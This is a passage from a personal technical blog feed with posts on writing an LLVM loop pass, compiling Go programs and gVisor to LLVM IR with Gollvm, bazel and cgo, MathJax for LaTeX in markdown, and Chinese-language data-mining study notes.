<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> </span>&#123;</span><br><span class="line">    LoopInfo &amp;LI = getAnalysis&lt;LoopInfoWrapperPass&gt;().getLoopInfo();</span><br><span class="line">    <span class="keyword">int</span> loopCounter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (LoopInfo::iterator i = LI.<span class="built_in">begin</span>(), e = LI.<span class="built_in">end</span>(); i != e; i++) &#123;</span><br><span class="line">        countBlocksInLoop(*i, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过利用 LoopInfoWrapperPass 得到的循环体信息，就可以通过递归调用函数来获取该循环体、子孙循环体的 basic block 信息，即 <code>countBlocksInLoop()</code> 函数的功能。具体的代码实现参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpYW55dXpob3U5NS9sbHZtLXByb2plY3QvYmxvYi9iMDc4MjA2Yzk5Yzk4MTQ2ZjU2MzIyYzAxZDQyNDNjMzQzMjVjNWIzL2xsdm0vbGliL1RyYW5zZm9ybXMvQkJDb3VudEluTG9vcC9Db3VudF9CbG9ja3NfSW5fTG9vcHMuY3BwI0wyMQ==" title="https://github.com/tianyuzhou95/llvm-project/blob/b078206c99c98146f56322c01d4243c34325c5b3/llvm/lib/Transforms/BBCountInLoop/Count_Blocks_In_Loops.cpp#L21">我的 GitHub<i class="fa fa-external-link"></i></span>。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9sbHZtLm9yZy9kb2NzLw==" title="https://llvm.org/docs/">LLVM Official Docs<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5mLmVkLmFjLnVrL3RlYWNoaW5nL2NvdXJzZXMvY3QvMTktMjAvc2xpZGVzL2xsdm0tMi13cml0aW5nX3Bhc3MucGRm" title="https://www.inf.ed.ac.uk/teaching/courses/ct/19-20/slides/llvm-2-writing_pass.pdf">llvm-2-writing_pass<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9sbHZtLm9yZy9kZXZtdGcvMjAxOS0xMC9zbGlkZXMvV2Fyenluc2tpLVdyaXRpbmdBbkxMVk1QYXNzLnBkZg==" title="https://llvm.org/devmtg/2019-10/slides/Warzynski-WritingAnLLVMPass.pdf">Warzynski-WritingAnLLVMPass<i class="fa fa-external-link"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>Language</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>llvm</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>Gollvm Compile gVisor To LLVM IR</title>
    <url>/2020/01/12/gVisor-to-LLVM-IR/</url>
    <content><![CDATA[<p><span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2Lw==" title="https://gvisor.dev/">gVisor<i class="fa fa-external-link"></i></span> is a useful container protection strategy provided by Google. However this blog is not about what gVisor is, but how to compile gVisor to LLVM IR using <span class="exturl" data-url="aHR0cHM6Ly9nby5nb29nbGVzb3VyY2UuY29tL2dvbGx2bS8=" title="https://go.googlesource.com/gollvm/">Gollvm<i class="fa fa-external-link"></i></span>.</p>
<a id="more"></a>

<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>The official gVisor branch in github is organized in bazel build project format. So when we want to use standard go build tool we have to find a pure go version for Gollvm to compile. <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9ndmlzb3IvdHJlZS9nbw==" title="https://github.com/google/gvisor/tree/go">This branch<i class="fa fa-external-link"></i></span> is what we want in this project, and just clone it from the github.</p>
<p> For more information about how Gollvm work, please refer to my <a href="https://tianyuzhou.top/2020/01/03/gollvm/">previous blog</a>.</p>
<p><strong>Remember to set right GOPATH and right project location.</strong></p>
<p>Don&#39;t build gVisor as the official documentation, for what we need is the LLVM IR for further research.</p>
<h2 id="Modify-the-Project"><a href="#Modify-the-Project" class="headerlink" title="Modify the Project"></a>Modify the Project</h2><p>After setting up necessary environment variables, I try to use <code>go build</code> in the directory <code>gvisor/runsc/</code>. However, I get some error while compiling the project, which is shown as below</p>
<ul>
<li>Change package in some <code>xx.pb.go</code> files, like change the package name inside the go file in the path <code>pkg/eventchannel/eventchannel_go_proto/event.pb.go</code> to <code>eventchannel_go_proto</code></li>
<li>Every assembly file as <code>.s</code> can not be compile by Gollvm</li>
<li>Some variables which defined to be <code>uint64</code> and is given the value of type <code>uint64</code> is reject by the compiler, like <code>msg.Controllen</code> and so on</li>
<li>The function <code>SetBurst()</code> is missing but is called by other code</li>
</ul>
<p>To deal with the above problems, I use the following methods</p>
<ul>
<li>Simply delete all assembly file ended with <code>.s</code></li>
<li>Change some line which contains <code>uint64</code> to magic number <code>10</code>, every changed code is noted a word <strong>zty</strong></li>
<li>Add a <strong>empty</strong> function named <code>SetBurst()</code></li>
</ul>
<p><strong>After doing these things, I still can not fully compile the whole project.</strong></p>
<p>However, the error message seems like the problem about linking libraries in the <code>.cache/go-project/</code> directory. So when I try to use the <strong>compile records to get LLVM IR, I succeeded.</strong></p>
<h2 id="Compile-the-Project-to-LLVM-IR"><a href="#Compile-the-Project-to-LLVM-IR" class="headerlink" title="Compile the Project to LLVM IR"></a>Compile the Project to LLVM IR</h2><p>Make sure using the instruction as following</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">GOPATH/gvisor.dev/gvisor/runsc/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> go build -work -x 1&gt; transcript.txt 2&gt;&amp;1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> egrep <span class="string">'(WORK=|llvm-goc -c)'</span> transcript.txt &gt; goc-instructions.txt</span></span><br></pre></td></tr></table></figure>

<p><strong>You have to make sure you are inside the <code>runsc</code> directory.</strong></p>
<p>Then we can get a lot of <code>llvm-goc</code> instructions inside the <code>transcript.txt</code>.</p>
<p>We can use python script to change these instructions to workable LLVM IR compile instruction.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ins</span> <span class="params">(origin_str)</span>:</span></span><br><span class="line">                num1 = origin_str.find(<span class="string">'-o'</span>)</span><br><span class="line">                num2 = origin_str.find(<span class="string">'.o'</span>)</span><br><span class="line">                str1 = origin_str[:num1<span class="number">-1</span>]</span><br><span class="line">                num3 = str1.find(<span class="string">"-fgo-pkgpath"</span>)</span><br><span class="line">                path = <span class="string">'$GOPATH/src/'</span> + str1[num3+<span class="number">13</span>:]</span><br><span class="line">                name = re.split(<span class="string">'/'</span>, path)[<span class="number">-1</span>]</span><br><span class="line">                str2 = origin_str[num2+<span class="number">3</span>:]</span><br><span class="line">                str2 = str2.replace(<span class="string">'./'</span>, path+<span class="string">'/'</span>)</span><br><span class="line">                <span class="keyword">return</span> str1 + <span class="string">' -o '</span> + name + <span class="string">'.ll -S -emit-llvm'</span> + str2</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"goc-instructions.txt"</span>)</span><br><span class="line">line = f.readline()</span><br><span class="line">line = f.readline()</span><br><span class="line"><span class="keyword">while</span> line:</span><br><span class="line">    <span class="keyword">print</span> (change_ins(line))</span><br><span class="line">    line = f.readline()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>In this python file we give the right file path and change the object file to be LLVM IR. be sure the arguments&#39; order <code>-S -emit-llvm</code>.</p>
<p>Of course there are some incorrect sentences in the output, just <strong>find them and do the same modification</strong>. (delete any code which does not have <code>llvm-goc</code>)</p>
<p>After doing all these things, you will get 155 files ended with <code>.ll</code>.</p>
<h2 id="Combine-All-LLVM-IR-to-Single"><a href="#Combine-All-LLVM-IR-to-Single" class="headerlink" title="Combine All LLVM IR to Single"></a>Combine All LLVM IR to Single</h2><p>The last step is to use <code>llvm-link</code> to get a single LLVM IR bitcode file from all these <code>.ll</code> files we get. But if you run the instruction</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> llvm-link *.ll -o out.bc</span></span><br></pre></td></tr></table></figure>

<p>You will get</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">inlinable function call in a function with debug info must have a !dbg location</span><br><span class="line">  call void @gvisor.x2edev..z2fgvisor..z2fpkg..z2fsleep..import(i8* nest undef)</span><br><span class="line">  .......</span><br><span class="line">llvm-link: error: linked module is broken!</span><br></pre></td></tr></table></figure>

<p>I search the function mentioned in the error log, and find that all these function caller is inside the <code>main.ll</code>. there is a function named <code>__go_init_main()</code> which has a <strong>debug information</strong> <code>!dbg !933</code> just behind the function name.</p>
<p>After <strong>delete the debug information</strong> the <code>llvm-link</code> can work, and the whole project&#39;s LLVM IR is finally get.</p>
]]></content>
      <categories>
        <category>Language</category>
        <category>Container</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>llvm</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Gollvm Compile Experience</title>
    <url>/2020/01/03/gollvm/</url>
    <content><![CDATA[<p>Gollvm is an LLVM-based Go compiler. This article is about how to use Gollvm to generate normal go code and go project to LLVM IR.</p>
<p>If you want more information of Gollvm, just refer to its official git <span class="exturl" data-url="aHR0cHM6Ly9nby5nb29nbGVzb3VyY2UuY29tL2dvbGx2bS8=" title="https://go.googlesource.com/gollvm/">repository<i class="fa fa-external-link"></i></span>.</p>
<p><em>REMEMBER TO USE /bin/bash TO EXEC CMAKE</em></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> SHELL=/bin/bash cmake -G .....</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="Clean-up"><a href="#Clean-up" class="headerlink" title="Clean up"></a>Clean up</h2><p>You have to clean up the temp build files before compile the go code.</p>
<p><code>/tmp/</code> and <code>~/.cache/</code> is the main two directories that you should pay attention to. Ensure that in these directories there are no files begin with &#39;go-build&#39;.</p>
<p>It not means that if these files exist, the go code will not able to be compiled, but it mean that you will get a normal executable file without the recording file which we need to generate LLVM IR.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls ~/.cache/ | grep go-build</span></span><br><span class="line">go-build</span><br></pre></td></tr></table></figure>



<h2 id="Export-environment-variables"><a href="#Export-environment-variables" class="headerlink" title="Export environment variables"></a>Export environment variables</h2><p> Because we want to compile the go code use gollvm, we should change the default go compiler first.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Root of Gollvm install is /tmp/gollvm-install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> LD_LIBRARY_PATH=/tmp/gollvm-install/lib64</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> PATH=/tmp/gollvm-install/bin:<span class="variable">$PATH</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> go version</span></span><br><span class="line">go version go1.13 gollvm LLVM 10.0.0svn linux/amd64</span><br></pre></td></tr></table></figure>



<h2 id="Compile-and-get-record"><a href="#Compile-and-get-record" class="headerlink" title="Compile and get record"></a>Compile and get record</h2><p>Then go the the position of the go code.</p>
<p>In this example we go to the directory of <code>$GOPATH/src/myapp/</code>, and in this directory contains this <code>main.go</code> file.</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"mytest"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Hello, world.  1+2 = %v\n"</span>, mytest.Sum(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Package <code>mytest</code> is defined in another directory <code>$GOPATH/src/mytest/</code>, and there is also a go file in it.</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sum.go</span></span><br><span class="line"><span class="keyword">package</span> mytest</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sum</span><span class="params">(x, y <span class="keyword">float64</span>)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Because <code>main.go</code> refers the function <code>Sum()</code> defined in package <code>mytest</code>, we have to use <code>go build</code> inside <code>mytest/</code> directory first.</p>
<p>Then we can compile the code inside the <code>myapp</code> directory.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/home/zty/go/src/myapp</span><br><span class="line"><span class="meta">$</span><span class="bash"> go build -work -x 1&gt; transcript.txt 2&gt;&amp;1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">main.go  myapp  transcript.txt</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./myapp</span></span><br><span class="line">Hello, world.  1+2 = 3</span><br></pre></td></tr></table></figure>

<p>Now we get an executable file <code>myapp</code> and a record of building instructions.</p>
<h2 id="Change-instruction-and-get-LLVM-IR"><a href="#Change-instruction-and-get-LLVM-IR" class="headerlink" title="Change instruction and get LLVM IR"></a>Change instruction and get LLVM IR</h2><p>Then we look for some important sentences in this file.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> egrep <span class="string">'(WORK=|llvm-goc -c)'</span> transcript.txt</span></span><br><span class="line">WORK=/tmp/go-build892006435</span><br><span class="line">/home/zty/workarea/llvmgo/bin/llvm-goc -c -O2 -g -m64 -fdebug-prefix-map=$WORK=/tmp/go-build -gno-record-gcc-switches -fgo-pkgpath=mytest -o $WORK/b003/_go_.o -I $WORK/b003/_importcfgroot_ ./sum.go</span><br><span class="line">/home/zty/workarea/llvmgo/bin/llvm-goc -c -O2 -g -m64 -fdebug-prefix-map=$WORK=/tmp/go-build -gno-record-gcc-switches -o $WORK/b001/_go_.o -I $WORK/b001/_importcfgroot_ ./main.go</span><br></pre></td></tr></table></figure>

<p>We find <code>WORK</code> which is the working directory of compilation and two building instructions using <code>llvm-goc</code>. Then we have to modify the building instructions to get LLVM IR in order for further research.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/mytest/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> WORK=/tmp/go-build892006435</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> /home/zty/workarea/llvmgo/bin/llvm-goc -c -O2 -g -m64 -fdebug-prefix-map=<span class="variable">$WORK</span>=/tmp/go-build -gno-record-gcc-switches -fgo-pkgpath=mytest -o sum.ll -S -emit-llvm -I <span class="variable">$WORK</span>/b003/_importcfgroot_ ./sum.go</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">sum.go  sum.ll</span><br></pre></td></tr></table></figure>

<p>Notice that we have changed <code>-o $WORK/b003/_go_.o</code> to <code>-o sum.ll -S -emit-llvm</code>. The <code>sum.ll</code> is the LLVM IR generated from <code>sum.go</code>.</p>
<p>And for <code>main.go</code> we just do the same thing.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/myapp/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> /home/zty/workarea/llvmgo/bin/llvm-goc -c -O2 -g -m64 -fdebug-prefix-map=<span class="variable">$WORK</span>=/tmp/go-build -gno-record-gcc-switches -o main.ll -S -emit-llvm -I <span class="variable">$WORK</span>/b001/_importcfgroot_ ./main.go</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">main.go  main.ll  myapp  transcript.txt</span><br></pre></td></tr></table></figure>



<h2 id="Convert-multiple-IR-to-one-IR"><a href="#Convert-multiple-IR-to-one-IR" class="headerlink" title="Convert multiple IR to one IR"></a>Convert multiple IR to one IR</h2><p>We can use <a href="http://llvm.org/docs/CommandGuide/llvm-link.html" target="_blank" rel="noopener"><code>llvm-link</code></a> tool to take several LLVM bitcode files and links them together into a single LLVM bitcode file. Of course, the input can be readable .ll files too.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/myapp/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">main.go  main.ll  myapp  transcript.txt</span><br><span class="line"><span class="meta">$</span><span class="bash"> llvm-link main.ll <span class="variable">$GOPATH</span>/src/mytest/sum.ll -o out.bc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">main.go  main.ll  myapp  out.bc  transcript.txt</span><br></pre></td></tr></table></figure>

<p>Then we use <code>llvm-dis</code> to translate the binary unreadable bitcode file.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> llvm-dis out.bc </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">main.go  main.ll  myapp  out.bc  out.ll  transcript.txt</span><br></pre></td></tr></table></figure>

<p>We can read this <code>out.ll</code> file and find both <code>main.main()</code> and <code>mytest.Sum()</code> functions.</p>
<p>Besides, we can run LLVM Pass on this LLVM IR which contains all functions in the project.</p>
]]></content>
      <categories>
        <category>Language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>llvm</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>bazel build cgo</title>
    <url>/2019/11/23/bazel-build-cgo/</url>
    <content><![CDATA[<p>使用 bazel 来 build go 项目的时候，如果在某个 <code>.go</code> 文件当中使用了 cgo 写法，那么这个文件的函数将无法被其他文件使用。这时需要在同级目录下 <code>BUILD</code> 文件当中做适当修改<br>参考 bazel go 的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2l4ZHkvYmF6ZWwtcnVsZXNfZ28jY2dvX2xpYnJhcnk=" title="https://github.com/ixdy/bazel-rules_go#cgo_library">官方文档<i class="fa fa-external-link"></i></span></p>
<p>然而我使用了上述设置 <code>BUILD</code> 文件的方法之后，依旧无法正常的编译 <span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2" title="https://gvisor.dev">gVisor<i class="fa fa-external-link"></i></span>，原因在 gVisor 论坛中作者也回复我了，是由于在 <code>/gvisor/runsc</code> 目录下的 <code>BUILD</code> 文件当中设置了 <code>pure</code> 参数，因此不允许除了纯 Golang 以外的其他用法。</p>
]]></content>
      <categories>
        <category>Language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>cgo</tag>
        <tag>golang</tag>
        <tag>bazel</tag>
      </tags>
  </entry>
  <entry>
    <title>display latex formula in markdown</title>
    <url>/2019/11/07/formula-in-markdown/</url>
    <content><![CDATA[<p>如何在 markdown blog 中正常显示 latex formula</p>
<a id="more"></a>

<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({
tex2jax: {
skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
inlineMath: [['$','$']]
}
});
</script>



<p>为了在我的 blog 当中正常显示 <span class="exturl" data-url="aHR0cHM6Ly93d3cubGF0ZXgtcHJvamVjdC5vcmcv" title="https://www.latex-project.org/">LaTeX<i class="fa fa-external-link"></i></span> 语法的公式，如</p>
<p>$$SplitInfo_A(D)=-\sum_{j=1}^{v} \frac{\left\lvert{D_j}\right\lvert}{\left\lvert{D}\right\lvert}\times log_2(\frac{\left\lvert{D_j}\right\lvert}{\left\lvert{D}\right\lvert})$$</p>
<p>对应的 LaTeX 代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$SplitInfo_A(D)&#x3D;-\sum_&#123;j&#x3D;1&#125;^&#123;v&#125; \frac&#123;\left\lvert&#123;D_j&#125;\right\lvert&#125;&#123;\left\lvert&#123;D&#125;\right\lvert&#125;\times log_2(\frac&#123;\left\lvert&#123;D_j&#125;\right\lvert&#125;&#123;\left\lvert&#123;D&#125;\right\lvert&#125;)$$</span><br></pre></td></tr></table></figure>

<p>具体的语法请参照<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC85N2VjOGEzNzM5ZjY=" title="https://www.jianshu.com/p/97ec8a3739f6">有关博客<i class="fa fa-external-link"></i></span>。</p>
<p>然而 markdown 是无法解析 LaTeX 公式的，同样基于 jekyll 的 github pages 也无法解析，这个时候只需要在每个 .md 文件的开头加上一段代码即可。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/x-mathjax-config"</span>&gt;</span></span><br><span class="line">MathJax.Hub.Config(&#123;</span><br><span class="line">tex2jax: &#123;</span><br><span class="line"><span class="actionscript">skipTags: [<span class="string">'script'</span>, <span class="string">'noscript'</span>, <span class="string">'style'</span>, <span class="string">'textarea'</span>, <span class="string">'pre'</span>],</span></span><br><span class="line"><span class="actionscript">inlineMath: [[<span class="string">'$'</span>,<span class="string">'$'</span>]]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>加上去之后通过动态的 javascript 脚本让公式能够正常显示。</p>
<h3 id="注意！！"><a href="#注意！！" class="headerlink" title="注意！！"></a>注意！！</h3><p>用 <code>\left\lvert</code> 和 <code>\right\lvert</code> 替代绝对值的左右竖线，否则会产生格式错误。因为简单的竖线在 markdown 中是用来表示表格的。</p>
]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>markdown</tag>
        <tag>latex formula</tag>
      </tags>
  </entry>
  <entry>
    <title>Data Mining Knowledge Points</title>
    <url>/2019/11/06/Data-Mining-List/</url>
    <content><![CDATA[<p>数据挖掘的知识点整理。</p>
<a id="more"></a>

<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({
tex2jax: {
skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
inlineMath: [['$','$']]
}
});
</script>



<h4 id="—-带上计算器！"><a href="#—-带上计算器！" class="headerlink" title="— 带上计算器！"></a>— 带上计算器！</h4><h3 id="Chapter-1"><a href="#Chapter-1" class="headerlink" title="Chapter 1"></a>Chapter 1</h3><ul>
<li>不同变量的相似性计算</li>
<li>统计量的计算和其优缺点</li>
<li>学会给定数据手工画 box plot</li>
<li>正态分布的几个数值</li>
<li>给定数据画直方图</li>
<li>直方图和boxplot的比较</li>
<li>散点图对于数据相关性的展现</li>
<li>数据可视化的一些基本认识 — 看图说话</li>
<li>散点图矩阵的概念</li>
</ul>
<h3 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h3><ul>
<li>每一种不同类型的数据，相似性如何衡量</li>
<li>Minkowski distance</li>
<li>L1 norm, L2 norm</li>
<li>余弦相似度</li>
<li>基本全部都很重要</li>
</ul>
<h3 id="Chapter-3"><a href="#Chapter-3" class="headerlink" title="Chapter 3"></a>Chapter 3</h3><ul>
<li>chi-square test</li>
<li>Correlation coefficient</li>
<li>Covariance, 独立性等关系</li>
<li>feature extraction</li>
<li>PCA，LDA 基本的结论<ul>
<li>PCA - 根据协方差矩阵求出相应的特征值和特征向量，然后按照特征值从大到小的顺序选取特征向量作为变换矩阵的列向量</li>
<li>LDA 有点难，具体的步骤可以参考<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMzc0Mjk4Mw==" title="https://zhuanlan.zhihu.com/p/33742983">这里<i class="fa fa-external-link"></i></span><ul>
<li>找到 $S_B = S_1 + S_2$ 和 $S_W = (\mu_1 - \mu_2)(\mu_1-\mu_2)^T$</li>
<li>$S_B\alpha=\lambda S_W\alpha$ 解出不同的特征向量 $\alpha$</li>
<li>得到转换矩阵 $A=[\alpha_1, ...,\alpha_c]$</li>
</ul>
</li>
</ul>
</li>
<li>sampling 的方法，strength and weakness<ul>
<li>simple random sampling</li>
<li>sampling without replacement (不放回抽样)</li>
<li>sampling with replacement (放回抽样)</li>
<li>cluster or stratified sampling (分类抽样，按类别占比选取样本个数 for skewed data)</li>
</ul>
</li>
</ul>
<ul>
<li>Data Transformation 相当重要，mix-max，z-score，decimal scaling<ul>
<li>Normalization<ul>
<li>mix-max <code>v&#39; = (v-min)/(max-min)*(max&#39;-min&#39;)+min&#39;</code></li>
<li>z-score <code>v&#39; = (v-mu)/sigma</code>, where mu is mean, sigma is standard varience</li>
<li>decimalscaling <code>v&#39; = v / 10^j</code>, Where j is the smallest integer such that $Max(\left\lvert{v’}\right\lvert) &lt; 1$ </li>
</ul>
</li>
</ul>
<ul>
<li>Discretization<ul>
<li>分箱法<ul>
<li>Equal-width 等宽，然而极端值决定了分箱情况，且对 skew data 的适应性不好</li>
<li>Equal-depth 等宽或等频率，每个箱子中有等量的数据，但是管理分类属性会很困难，K-Means 具有更好的分类结果</li>
</ul>
</li>
<li>直方图分析</li>
<li>聚类分析</li>
<li>决策树分析</li>
<li>相关性分析，如 chi-square 测试</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>概念分层<ul>
<li>对 data set 中的 attributes 进行分层，如 street &lt; city &lt; state &lt; country</li>
</ul>
</li>
</ul>
<h3 id="Chapter-4"><a href="#Chapter-4" class="headerlink" title="Chapter 4"></a>Chapter 4</h3><ul>
<li><p>basic concepts</p>
<ul>
<li>Item-set</li>
<li>K-itemset</li>
<li>(absolute) support / support count</li>
<li>(relative) support</li>
<li>Frequent</li>
</ul>
</li>
<li><p>关联规则</p>
<ul>
<li>Support and confidence</li>
<li>Beer -&gt; Diaper (60%, 100%)</li>
</ul>
</li>
<li><p>Closed pattern 和 Max pattern</p>
<ul>
<li>closed pattern - 没有比他大同时 support 和它一样的 pattern</li>
<li>max pattern - 没有比它还要大的 frequent pattern</li>
</ul>
</li>
<li><p>Apriori - 方法、弱点</p>
<ul>
<li>若一个 itemset 不是 frequent，那么它的 superset 也一定不是 frequent，因而不需要被测试</li>
<li>层层递进，一直到 length k frequent item set</li>
<li>两个大部分，一个是层层递进的 generate item set，仅保留 frequent ones 然后再次组合，直到 item set 的元素数目为 threshold+1 时，进行剪枝，即剔除子集中包含非 frequent 的 item set。最后再扫描一遍数据库确认。</li>
</ul>
</li>
<li><p>FP-Tree - 构造、给定导出频繁模式</p>
<ul>
<li>扫描一遍 data base 得到每个 pattern 的频率，根据这个频率排序，然后再把原来 data base 里面的 item 按照 pattern frequency 排序，最后按照这个来画 FP-Tree</li>
<li>对 FP-Tree 进行 mining 的时候，按照之前的到 frequency 的倒序，对每个 item 先找到 conditional pattern Base 也就是前缀，再找到出现次数大于等于 min support 的 item，再进行组合得到 frequent pattern</li>
<li>优点：完整性和简洁性</li>
</ul>
</li>
<li><p>Sequential pattern</p>
<ul>
<li>apriori -&gt; GSP</li>
</ul>
</li>
<li><p>Pattern evaluation - Interestingness Measure Correlations ppt slides</p>
<ul>
<li>Lift = P(AUB) / P(A)P(B)</li>
</ul>
</li>
</ul>
<h3 id="Chapter-5"><a href="#Chapter-5" class="headerlink" title="Chapter 5"></a>Chapter 5</h3><ul>
<li>Classification<ul>
<li>Model construction</li>
<li>Model usage<ul>
<li>estimate accuracy</li>
<li>test set / validation set (latter used to select model)</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>Decision Tree *</p>
<ul>
<li>自顶向下的递归分治法</li>
<li>属性已经分类（若是连续型的值就提前离散化）</li>
<li>根据选择的属性将 examples 分组</li>
<li>information entropy $H(x)=-\Sigma_xp(x)log_2p(x)$<ul>
<li>entropy 越大，则不确定性越大，该信息量越大</li>
</ul>
</li>
<li>在决策树构建时，选择获得信息量最大（highest <strong>information gain</strong>）的 attribute - ID3<ul>
<li>$Info(D)=-\sum_{i=1}^m p_ilog_2(p_i)$ 选择 attribute 之前的信息熵</li>
<li>$Info_A(D)=\sum_{j=1}^v \frac{\left\lvert{D_j}\right\lvert}{\left\lvert{D}\right\lvert}\times Info(D_j)$ 选择attribute 之后的信息熵</li>
<li>$Gain(A)=Info(D)-Info_A(D)$ 二者之差为信息增量</li>
</ul>
</li>
<li>GainRatio to overcome attributes with large number of values</li>
